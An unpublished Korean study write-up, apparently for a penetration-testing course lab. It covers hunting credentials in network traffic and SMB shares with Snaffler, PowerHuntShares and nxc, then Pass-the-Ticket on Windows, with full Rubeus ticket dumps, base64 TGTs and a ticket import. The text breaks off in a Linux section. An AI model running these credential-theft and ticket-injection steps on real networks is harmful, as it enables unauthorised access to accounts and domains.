---
title: "Password Attacks - Additional Techniques"
date: 2026-08-18
layout: single
excerpt: "Windows 환경에서 파일, 브라우저, 레지스트리, 저장된 세션, 백업, 클립보드 등을 통해 자격 증명을 수집하고, 사용자 상호작용 및 다양한 추가 기법을 활용해 권한 상승과 횡적 이동으로 이어지는 공격 흐름을 실습한다."
author_profile: true
toc: true
toc_label: "Password Attacks"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [windows, cpts, priv-esc, credential-theft, pillaging, lateral-movement, registry, browser-credentials, scheduled-tasks]

published: false
---

# Extracting Password from the Network

## Credential Hunting in Network Traffic

또한 네트워크에서 자격증명이 평문으로 패킷이 전달되거나 그럴수도있다.

따라서 그 패킷에 대하여 와이어 샤크나 tcpdump를 활용해 그 평문의 패킷을 낚아 챌수있따.

이처럼 필터링을 통해 http 패킷을 훑어보니 /process_payment의 어떠한 사용자의 신용카드 정보가 나와있는것을 확인할수있다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack1.png)

또한 ftp를 필터링해서 보게되면 user와 passwd가 고스란히 찍힌후 로그인에 성공하였음을 확인할수있다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack2.png)

그리고 아래를 보면 creds.txt 파일이 다운로드 된것을 확인할수있었다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack3.png)

따라서 이처럼 패킷 캡처한 부분을 확인한후, ftp 서버로 이동하여 침해가 갈수있는 영향이존재할수있게뙨다.

## Credential Hunting in Network Shares

또한 공유 디렉토리 파일에서도 어떠한 자격증명이 존재할수있다.

대표적인 툴은 스니퍼.exe 툴이 존재하며 여러 공유 디렉토리를 탐색하여 자동화로 뽑아주는 도구이다.

이처럼 작성한후 보게되면 자극적인 부분만 골라서 자동화가 될수있다:

```powershell
PS C:\Users\Public> Snaffler.exe -s

# SKIP

[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:51Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>(\\DC01.inlanefreight.local\ADMIN$\Panther\unattend.xml) 5"\ language="neutral"\ versionScope="nonSxS"\ xmlns:wcm="http://schemas\.microsoft\.com/WMIConfig/2002/State"\ xmlns:xsi="http://www\.w3\.org/2001/XMLSchema-instance">\n\t\t\ \ <UserAccounts>\n\t\t\ \ \ \ <AdministratorPassword>\*SENSITIVE\*DATA\*DELETED\*</AdministratorPassword>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ </UserAccounts>\n\ \ \ \ \ \ \ \ \ \ \ \ <OOBE>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ <HideEULAPage>true</HideEULAPage>\n\ \ \ \ \ \ \ \ \ \ \ \ </OOBE>\n\ \ \ \ \ \ \ \ </component
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:53Z [File] {Yellow}<KeepDeployImageByExtension|R|^\.wim$|29.2MB|2022-02-25 16:36:53Z>(\\DC01.inlanefreight.local\ADMIN$\Containers\serviced\WindowsDefenderApplicationGuard.wim) .wim
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:58Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>(\\DC01.inlanefreight.local\C$\Windows\Panther\unattend.xml) 5"\ language="neutral"\ versionScope="nonSxS"\ xmlns:wcm="http://schemas\.microsoft\.com/WMIConfig/2002/State"\ xmlns:xsi="http://www\.w3\.org/2001/XMLSchema-instance">\n\t\t\ \ <UserAccounts>\n\t\t\ \ \ \ <AdministratorPassword>\*SENSITIVE\*DATA\*DELETED\*</AdministratorPassword>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ </UserAccounts>\n\ \ \ \ \ \ \ \ \ \ \ \ <OOBE>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ <HideEULAPage>true</HideEULAPage>\n\ \ \ \ \ \ \ \ \ \ \ \ </OOBE>\n\ \ \ \ \ \ \ \ </component
# SKIP
```

또한 저런것 아니여도 PowerHuntShares 도구를 활용해 네트워크 공유 파일들의 자격증명들을 대규모로 조사해주는 도구가 있다:

```powershell
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

 ---------------------------------------------------------------
 SHARE DISCOVERY
 ---------------------------------------------------------------
 [*][05/01/2025 12:51] Scan Start
 [*][05/01/2025 12:51] Output Directory: c:\Users\Public\SmbShareHunt-05012025125123
 [*][05/01/2025 12:51] Successful connection to domain controller: DC01.inlanefreight.local
 [*][05/01/2025 12:51] Performing LDAP query for computers associated with the inlanefreight.local domain
 [*][05/01/2025 12:51] -  computers found
 [*][05/01/2025 12:51] - 0 subnets found
 [*][05/01/2025 12:51] Pinging  computers
 [*][05/01/2025 12:51] -  computers responded to ping requests.
 [*][05/01/2025 12:51] Checking if TCP Port 445 is open on  computers
 [*][05/01/2025 12:51] - 1 computers have TCP port 445 open.
 [*][05/01/2025 12:51] Getting a list of SMB shares from 1 computers
 [*][05/01/2025 12:51] - 11 SMB shares were found.
 [*][05/01/2025 12:51] Getting share permissions from 11 SMB shares
# SKIP
```

그리고 이 툴의 좋은점이 저렇게 탐색에 완료한후 HTML을 REPORT 형식으로 발급해준다는 장점이 존재한다.

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack4.png)

그리고 또한 nxc를 통하여 내트워크 공유파일에서 passw를 지정한뒤에 찾는 방식도 존재한다:

```bash
$ nxc smb 10.129.234.173 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"

SMB         10.129.234.173  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.234.173  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
SMB         10.129.234.173  445    DC01             [*] Started spidering
SMB         10.129.234.173  445    DC01             [*] Spidering .
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/split_tunnel.txt [lastm:'2025-05-01 13:26' size:224 offset:224 pattern:'passw']                                                                           
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/CHANGELOG.txt [lastm:'2025-05-01 13:27' size:11411 offset:4096 pattern:'passw']                                                            
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/README.md [lastm:'2025-05-01 13:27' size:17490 offset:12288 pattern:'passw']                                                               
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/ActiveDirectory/Add-ConstrainedDelegationBackdoor.ps1 [lastm:'2025-05-01 13:27' size:5055 offset:4096 pattern:'passw']                     
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/ActiveDirectory/Add-ConstrainedDelegationBackdoor.ps1 [lastm:'2025-05-01 13:27' size:5055 offset:5055 pattern:'passw']                     
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/Antak-WebShell/antak.aspx [lastm:'2025-05-01 13:27' size:10444 offset:4096 pattern:'passw']                                                
SMB         10.129.234.173  445    DC01             //10.129.234.173/IT/Tools/nishang-master/Antak-WebShell/antak.aspx [lastm:'2025-05-01 13:27' size:10444 offset:10444 pattern:'passw'] 
```

이처럼 파일 내용에 passw가 들어간 파일들을 찾는 명령도 할수있게된다.

직접 들어가 맨 첫번째인 split_tunnel.txt의 파일 내용을 보게되면 이렇게 자격증명이 적혀있는것을 확인할수있다:

```text
Old settings for legacy VPN deployment:
- Use split tunneling where possible
- DNS resolution priority = local > remote

# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###

- Ports used: 443, 8443, 1194
```

# Windows 리터럴 무브먼트 Techniques

## Pass the Ticket (PtT) from Windows

이제 ad 환경에서는 사용자의 인증을 대신 인증해줄수있는 티켓이 존재한다.

이게 사용자의 자격증명이 없어도 티켓을 통하여 인증을 수행할수있기에 많이 사용하게된다.

우선 이번 계정은 로컬 서버에서 어드민으로 도달한후, 티켓을 이용해 횡적이동을 하는 시나리오다

이렇게 내부에서 dump를 활용하여 내부애들을 추출할수있따:

```powershell
PS C:\Users\Administrator> .\Rubeus.exe dump /nowrap

Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x14d304

  UserName                 : julio
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x44708
  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1106
  AuthenticationPackage    : Kerberos
  LogonType                : Service
  LogonTime                : 8/19/2026 2:46:30 PM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.HTB
  UserPrincipalName        : julio@inlanefreight.htb


    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
    ServiceRealm             :  INLANEFREIGHT.HTB
    UserName                 :  julio
    UserRealm                :  INLANEFREIGHT.HTB
    StartTime                :  8/19/2026 2:46:30 PM
    EndTime                  :  8/20/2026 12:46:30 AM
    RenewTill                :  8/26/2026 2:46:30 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  e/3iHa4EJoSXfh5Zx3sXyOP/vGJtCcT9XJVbaUQq78Q=
    Base64EncodedTicket   :

      doIFujCCBbagAwIBBaEDAgEWooIEszCCBK9hggSrMIIEp6ADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBGEwggRdoAMCARKhAwIBAqKCBE8EggRLHKvsJTiHT12KfCHeVsEnVmr4ufMuH1fLivAeQ3OQayj1wrzl6GiwptrLMoj/M9vGjbu3010EC9QmX5L4rg+oiP8j5F4E8T5D0vYIFCnr5Wmw8aukB0Sv9Q6p9ulnBxkYV8sr+LoSg/ITqj08SmbauS8ejyebhH50xpTPfXKYiYMdC2Mqj0aacsuRy1xjSOFyJudb97PtyFCfCL7E4DZ97K+tNemgfRw/HC3wSJif+rgGDyl23KuCvAOAT28bH83I3LbDB/MVW/A/3PiSNHaUu9RhKP+PkCBd8REsVfMgatf2EOeD/X/wKRNZUoVcg5pkoJ6O+rFz9q2A14UHbhXfxQ4DNz7QK4OGNZ66bb1I6I+kkNZMZM48T4TZfW0K4yuGPoVsuz6XXtNAE3nLkN2rZ2dd32d7xr2aAZpyqTWdZKHr+soDV5VX7mKsOf385oIKrVwWDCTeOGdp7WAnqKvmxaLDzM+1kdTzdbYTzn9e/NzRbGpAgTlIJ4hdY2PkMzY/vSG+b8DqMJdTt5rx9uQQluT8pwSGzGEAz8u52UbXLeq00QczvrW9ScisUHaq09NCWq4jzjmjMzrOCSkVDQBJWyv20YLEoVTGpXQcKKcN3mUVg8f0uVLpjmGAk0/xFJSKHywnhW9rcZvdGA2+LOcBPDXLJqee7C/YvbX7ucKXT76THIofbOjwcWHB+s57n0ywUk3YjEnsC9SJJh0G01QKAb+v1xAn1d3mGUgu1/kKRJ+kG1fifNoAOL8NKFMuJrhG2EQzE2BpUwrMGObx25SkXS18xGjTFsgfGTm1sXMsuPwN9g8ga0BieOzSkN9L5a8en4LSgvVWzab4/SHUtlFGRNLUjwWjqYVt7en5b/dTMY/DXISttfmVnv+aFAJ8qT0OA//Oy/Sx4Od/TaEWsYV+Nvnf/KHcsLmjosC0lCV1FJYnuBna4gdH/sQKiJuSrjU42Bx8TtFT8Z1UqP2pcyI/ABCsoQkgiCmGB37OO+EKdKkSgQL9vBNYDexLVodefxiQ+lJZVLDzjE9XNvAfA13/lE/FZoFrWl3vF3ZdvdKLp7xB3QjI++0pzdDndpe3E7xsdUx+eAL9oT4F9vJ7L5T1ZA8HoBA9Y27Pi8d3WMzA2D13THCta92mKxWJh+CEWaV3YKIY6+mJdZLyEJVgorQ7gKJzJ1DaLFFgN2z+tspK7g8pJ3Sy8YCiBHbenQFOpirkX55uppyEIhCCgxB/jOuY1oyE+0E5mqV/ooy7dBpl9qvZKvQ4bkWN7j1wVttu6aJzjbTFYaJXLvmqaM48GZBEEFj/WIhIhC+uv2K3VebK6TLIQ5CKj7xb4yLI6Y9GeGwAVmM5fbsA3palWvSF8runSevPzo8l5/C8rNtqBb+CAqScc7cu6tJ08EZS5sXLEr/cW7jh6qmc1UU9JMekrvWj4mg/b3X4b8u0IBC62xjdXxGiJoxHKPaAPXxlyqOB8jCB76ADAgEAooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIHv94h2uBCaEl34eWcd7F8jj/7xibQnE/VyVW2lEKu/EoRMbEUlOTEFORUZSRUlHSFQuSFRCohIwEKADAgEBoQkwBxsFanVsaW+jBwMFAEDhAAClERgPMjAyNjA4MjYxOTQ2MzBaphEYDzIwMjYwODI3MDU0NjMwWqcRGA8yMDI2MDkwMjE5NDYzMFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC

  UserName                 : david
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x45a36
  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1107
  AuthenticationPackage    : Kerberos
  LogonType                : Service
  LogonTime                : 8/19/2026 2:46:30 PM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.HTB
  UserPrincipalName        : david@inlanefreight.htb


    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
    ServiceRealm             :  INLANEFREIGHT.HTB
    UserName                 :  david
    UserRealm                :  INLANEFREIGHT.HTB
    StartTime                :  8/19/2026 2:46:31 PM
    EndTime                  :  8/20/2026 12:46:31 AM
    RenewTill                :  8/26/2026 2:46:31 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  qU8MprSv2c8wGJycPkEHQdgAU+c6Dl5nnuvfz9YC6Rg=
    Base64EncodedTicket   :

      doIFsjCCBa6gAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFkwggRVoAMCARKhAwIBAqKCBEcEggRDCg2Bbn+zccJ5p7FjE6yefZXv5+qMYzVEqd5fY4XMhkJ2C48lY+Kil9Jc7PjPSrsNobZYlnzjVF5i7EwLdwFpbwQ6tR1ytp2Ab6u5U1cglSHTSkN1cpqDI+f74O2bR8VBvZPMb0RpzJ/xUwoN+LAgUf7yWlfqwu4bD8G1TfN6jdf2Be3MeyGOH3LKhjJfEbpPihsOGiIdxUTI7JioZ+1jJQ/5ywucaLh+E+kAUe+OfLZqP8LCNkVW+VvXvka2zIY8qvvtKzuAQN1FaA4mvx5G5202PCfr30EXJ1qv+nRGDa5pB5zNV6XWnwVEl8kOI8OOIi+sarZ7YgeTYbtTmynp8C2UXsLzPDSOfM0knZXu8wzyO//Ly+/w7cvR8XVlLnuuYTlLCXRIacG3fbqRJ+NpOM7BkmLgG+BefaskZQ5iQ1/IBTCoO0t6U/rt8E9UDu63B/J3lMset+OZMT6F/ERT+iWBVQOhFR8g7LPR+gW7SXGDpd3x0hehiZHb/fUUG3X3kKhbU75F509SfBu6Hin2Am0pZnQP19T1MfTTkzJm/BlTeoMVg8h6kDj8ysOtEvqbMU+8zqdDF9IMqgiSE/kzeS3P+8iHMhTQETIub49LeCWpuWZV//YaU5DgLHpNTHYYAjETnrBKRjOMmWuQeDc/lMt15PIjs+ctJIjx5JGB8B+ndwKwNSaO6fXbeZEzw4zLW4ptD/Thy/xftob0XTt5m/ij0YUyyATd9Ayex09Lh0uH9ESMmZFOg8G7RAn+nXQ83yvh+Yo50/uUO2FCyNeHtFEGYllRb2Wcp8CmIVknKDDfAFgAw225YrofmWuraUOXrLF9rxy6OabrwPvgzQNZhS1Rn6vrqOYStBYiS92bf4BAMMuaCGsR6iKxe/XzQgtbp6ujXzGvfYOYz3illnwHpa5wv5nzrRnOfieYdRwtYrgNLgaZLq8UbGJ8asrrCdZhJ7d5mxoMeDzSnMK5vmVhFG92Ay0q0/0WlPAUK12HvY2AeM45JhM9GPOYzbCrJEAdg+PPmCgMjsdOBonB8dL8P+jv0kMukfkmI2tTi+o8GQB0moEbTCdw+1EIyRXNNMCO0AaxAdxTmTIr9r5npP+oIo1IS7F7WluV68sXur+geIg4vLtjWyFwO0+GZ+jdvq1pU2PPXWjCn2TT4IOPopa2hNZyvVAReEQu27PrjNU59GWtXdgW628QQvDhNLXuLtCO88UI/YCuGQDEtUhu4vWS7+RBqeNtgXC3pRYAlc5+vuyCs4ne+1vEwkFyVWpRq/XmricNpOihWQG7mC4EF96S6vxxUBAc5GyRKGBAg5AmL/90fDEbYP0ygjewPTA4gjm+9YaHLtNR3PgQS8aBR5GEzkWlkmHE7IqeqAdsGyu+Mp3Z3vCzGLS9+7Xk2TlXUD3aeFgQahy3F5GBEX386LkWy+nOmXvH7+LEDOkoCq6DWKmodTCjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCCpTwymtK/ZzzAYnJw+QQdB2ABT5zoOXmee69/P1gLpGKETGxFJTkxBTkVGUkVJR0hULkhUQqISMBCgAwIBAaEJMAcbBWRhdmlkowcDBQBA4QAApREYDzIwMjYwODI2MTk0NjMxWqYRGA8yMDI2MDgyNzA1NDYzMVqnERgPMjAyNjA5MDIxOTQ2MzFaqBMbEUlOTEFORUZSRUlHSFQuSFRCqSYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQg==

  UserName                 : john
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x450ea
  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1108
  AuthenticationPackage    : Kerberos
  LogonType                : Service
  LogonTime                : 8/19/2026 2:46:30 PM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.HTB
  UserPrincipalName        : john@inlanefreight.htb


    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
    ServiceRealm             :  INLANEFREIGHT.HTB
    UserName                 :  john
    UserRealm                :  INLANEFREIGHT.HTB
    StartTime                :  8/19/2026 2:46:30 PM
    EndTime                  :  8/20/2026 12:46:30 AM
    RenewTill                :  8/26/2026 2:46:30 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  cjopRz7eJOhR0VMKCkHnQZ436Ue0HlleaLJGxlR0pY8=
    Base64EncodedTicket   :

      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ69cPsRJ8UxiRmke3oGPZpoT2TbBanqI5k906Oeu0tkXibLfbKo1cxXBDNSlihlMuZeDiGpriYweBnko6pp+14vTZqgUMoi8AnMLG3cUc35mh81XWKyRcPUBcQsb0em7kqM/AUG+Q/Xryv95SUdztsmXu7BqStCOuscPFqoUIyofIveI56hEEWa6FDgm/gD0BomrDuWb3Fr8OOjJiWXY/9IwGoV4RldE+MYQ1WOO1LNnCAsrhI9uS4zol6NYtNmjtdMrjRJwNMl1jXk01ly1PMDwswf7RLwv6HRftzds4B5qkl/qWRFoWQ7LANQYB9SYZHsruiGxh0gCPNFjcaMau5z4oPewEJiZiiX1lPmRCto1/fbVarqni1N9hXMMRdtBBHNOHFEXnxNlxRxVO9uVn3MzUv5+JQ4oetFb/0KLhqtP1mqUtnuReZxKcFB9Rsc5jmNP/cwaMjv33QDZIXRybgvMUkKcxDeNNdqIZPkf2r3vgekA8ll0/wjtou49P9PSvqnnzD9AKvujzepFOPHBEVNCoXfABsIvMxChtygrTE+eUbbfUuURwdDMeFB6eJhYdRqLMJ2M50pNwtF0PrjFZXKpbki1JMiFSfSyfVijvHhfX+9DsWWf/WZRq2kuZJqdpKmvgYv71a011qU8M+earQFczEMLDdsiWuC48YwlQhTmQ6mvJKOfOpyqVv/5xN5SeDbaxtQBvtuN0fc3p+8bqs50nxy2IZNwF9WWiDKq0IaVhAD9lCcKc87XNa6yIxXBwxQn1bqE+tDdJUmBW4x2kzqupt2z3Wrs8elYq0Dj4EYzAbjELzFiDFBSWo6IoQBDnA5DQYwqbAzDcbg3wzGE1ZP8D21vmm8Ok7TbF+IFo06Ly61e1dClC8xB8KmhvV/miGMcRf1EpJqoJSnL6bCmzS34G4vW5T+KwPhTlBYVvxqilL4uo0LoyKiwq2rNOWg25xZP+eb8ZlQjJ4BZWO8TaUxmI0zGziKee9H969lz3AzGHpW8Lb5H/0ORcLe/qH8Jt4mFUe38EJkilqIvvSB9KfjCnZEnx6X1qAGXH5rfThJ7ni6kKgmCiYX9XroTFiK5Djmq9q0QF7OM//tAhPLolGKl3pb7kuPCDHLgu+qvMzPC4GakpGUS9QRBJ4evfLkWQR58FLtmTP9jj/pwYLN3W1yipVvT7s95QAifA7QdhzWfH00KvNc18NUEmnxS0RLYUNOf3XoA3LelxoT7qgavoAN/1rlUgQO2IShO3cNphCH+BzloWcq874Tn1kqeUaW8mYkjKJX4nKBZ3fp0gqPfD54fJ4tmhmL0yn87JKd1exdx1yenhunCCBvGxTav7MoBVaK5gshbtLfAZtzwuHrDHRlbl+MmlWnGFAzoTwg8kKuUufxi6ytlbPy7WdieiLzPFnB32DYtOTDeYsEtCVok/hOI74mFMwKK2rG3qjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCByOilHPt4k6FHRUwoKQedBnjfpR7QeWV5oskbGVHSlj6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjA4MjYxOTQ2MzBaphEYDzIwMjYwODI3MDU0NjMwWqcRGA8yMDI2MDkwMjE5NDYzMFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC
```

이처럼 현재 john, david, julio의 티켓들이 lsass나 켈베로스 세션에서 존재함을 확인할수있다.

따라서 현재 각 티켓들은 살아있고, 티켓을 현 서버에 저장시켜 smb와 통신이 가능할수있다.

현재 티켓 발급의 구조는 이러하다:

john으로 가정하고 내부에서 발급을 요청하게되면 kdc, as 측에서 john이 맞는지 확인한 후 tgt를 보내준다.
이때의 tgt는 krbtgt로 보호된 tgt를 부여받으며, 유효한 tgt가 된다.

따라서 이를 통하여 만약에 보호된 tgt를 부여받고 smb 서비스에 접근한다고 가정하자.
그렇다면 그 tgt를 kdc, as 측에서 또 한번 검증한뒤 krbtgt의 키를 이용하여 복호화를 수행시켜 tgs를 발급하게 해준다.

따라서 rebeus의 골든티켓에서 krbtgt의 키(해시) 가 존재하게되면 따로 kdc를 안거치고 로컬에서 즉석으로 공격자가 티켓을 만들수 있기에 치명적이게된다.

> 또한 내부에서 로컬과 도메인 서버는 다른 계정이다.
예를들면 whoami 을 입력할때 현재는 다음과 같다:

```powershell
PS C:\Users\Administrator> whoami

ms01/administrator
```

이처럼 현재 서버는 로컬에 해당하는 서버이다.

따라서 현 서버는 도메인과 직접적 연관이 없는 서버기에 만약 tgt의 대부분 연관되어있는 곳은 도메인 서버이다.
따라서 그 도메인 tgt 를 이용하여 같은이름으로 로컬 서버에 들어갈려하면 무조건 실패하게된다. (그리고 애초에 로컬서버는 AD가 존재하지않아 tgt 라는 개념이 존재하지않는다.)

이를 기준으로 현재 도메인 계정에 해당되는 3마리의 tgt를 획득한 상태이므로 이를 활용하여 smb tgs를 발급할수있다.

이를 토대로 ptt를 이용하여 john의 tgt를 삽입하였다:

```powershell
PS C:\Users\Administrator> .\Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ69cPsRJ8UxiRmke3oGPZpoT2TbBanqI5k906Oeu0tkXibLfbKo1cxXBDNSlihlMuZeDiGpriYweBnko6pp+14vTZqgUMoi8AnMLG3cUc35mh81XWKyRcPUBcQsb0em7kqM/AUG+Q/Xryv95SUdztsmXu7BqStCOuscPFqoUIyofIveI56hEEWa6FDgm/gD0BomrDuWb3Fr8OOjJiWXY/9IwGoV4RldE+MYQ1WOO1LNnCAsrhI9uS4zol6NYtNmjtdMrjRJwNMl1jXk01ly1PMDwswf7RLwv6HRftzds4B5qkl/qWRFoWQ7LANQYB9SYZHsruiGxh0gCPNFjcaMau5z4oPewEJiZiiX1lPmRCto1/fbVarqni1N9hXMMRdtBBHNOHFEXnxNlxRxVO9uVn3MzUv5+JQ4oetFb/0KLhqtP1mqUtnuReZxKcFB9Rsc5jmNP/cwaMjv33QDZIXRybgvMUkKcxDeNNdqIZPkf2r3vgekA8ll0/wjtou49P9PSvqnnzD9AKvujzepFOPHBEVNCoXfABsIvMxChtygrTE+eUbbfUuURwdDMeFB6eJhYdRqLMJ2M50pNwtF0PrjFZXKpbki1JMiFSfSyfVijvHhfX+9DsWWf/WZRq2kuZJqdpKmvgYv71a011qU8M+earQFczEMLDdsiWuC48YwlQhTmQ6mvJKOfOpyqVv/5xN5SeDbaxtQBvtuN0fc3p+8bqs50nxy2IZNwF9WWiDKq0IaVhAD9lCcKc87XNa6yIxXBwxQn1bqE+tDdJUmBW4x2kzqupt2z3Wrs8elYq0Dj4EYzAbjELzFiDFBSWo6IoQBDnA5DQYwqbAzDcbg3wzGE1ZP8D21vmm8Ok7TbF+IFo06Ly61e1dClC8xB8KmhvV/miGMcRf1EpJqoJSnL6bCmzS34G4vW5T+KwPhTlBYVvxqilL4uo0LoyKiwq2rNOWg25xZP+eb8ZlQjJ4BZWO8TaUxmI0zGziKee9H969lz3AzGHpW8Lb5H/0ORcLe/qH8Jt4mFUe38EJkilqIvvSB9KfjCnZEnx6X1qAGXH5rfThJ7ni6kKgmCiYX9XroTFiK5Djmq9q0QF7OM//tAhPLolGKl3pb7kuPCDHLgu+qvMzPC4GakpGUS9QRBJ4evfLkWQR58FLtmTP9jj/pwYLN3W1yipVvT7s95QAifA7QdhzWfH00KvNc18NUEmnxS0RLYUNOf3XoA3LelxoT7qgavoAN/1rlUgQO2IShO3cNphCH+BzloWcq874Tn1kqeUaW8mYkjKJX4nKBZ3fp0gqPfD54fJ4tmhmL0yn87JKd1exdx1yenhunCCBvGxTav7MoBVaK5gshbtLfAZtzwuHrDHRlbl+MmlWnGFAzoTwg8kKuUufxi6ytlbPy7WdieiLzPFnB32DYtOTDeYsEtCVok/hOI74mFMwKK2rG3qjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCByOilHPt4k6FHRUwoKQedBnjfpR7QeWV5oskbGVHSlj6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjA4MjYxOTQ2MzBaphEYDzIwMjYwODI3MDU0NjMwWqcRGA8yMDI2MDkwMjE5NDYzMFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

이 상태에서 klist를 보게되면 정상적으로 john의 tgt가 삽입된것을 확인할수있다:

```powershell
PS C:\tools> klist

Current LogonId is 0:0x14d304

Cached Tickets: (1)

#0>     Client: john @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 8/19/2026 14:45:43 (local)
        End Time:   8/20/2026 0:45:43 (local)
        Renew Time: 8/26/2026 14:45:43 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

이를 토대로 dc01의 john 통신을 smb 요청하였다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack5.png)

그 결과 이처럼 내부에 진입할수있게된다.

또한 만약 john한테 winrm이나 rdp 들어갈수있는것이 존재하게되면 이렇게도 가능해진다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attack6.png)

이렇게 원격 이동으로 도메인 내부의 john 유저로 들어갈수있게된다.

## Pass the Ticket (PtT) from Linux

또한 리눅스에서도 active directoey랑 관련이 있을수가있다.

보게되면 이처럼 david와 julio가 active directory 소속인것을 확인할수잇다:

```bash
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

또한 realm이 안깔려져있으면 이를 적어서 추론할수있따:

```bash
